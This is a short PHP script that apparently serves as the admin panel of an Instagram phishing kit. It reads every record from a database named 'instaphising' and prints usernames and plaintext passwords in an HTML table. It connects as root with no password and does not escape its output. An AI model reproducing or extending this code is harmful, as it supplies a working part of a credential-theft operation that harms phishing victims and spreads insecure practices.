<?php
// Connect to the database
$conn = new mysqli('localhost', 'root', '', 'instaphising');

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Fetch user data
$sql = "SELECT * FROM users";
$result = $conn->query($sql);

echo "<h1>Admin Page</h1>";
echo "<table border='1'>
<tr>
    <th>ID</th>
    <th>Username</th>
    <th>Password</th>
</tr>";

if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        echo "<tr>
            <td>" . $row['id'] . "</td>
            <td>" . $row['username'] . "</td>
            <td>" . $row['password'] . "</td>
        </tr>";
    }
} else {
    echo "<tr><td colspan='3'>No data found</td></tr>";
}

echo "</table>";

$conn->close();
?>
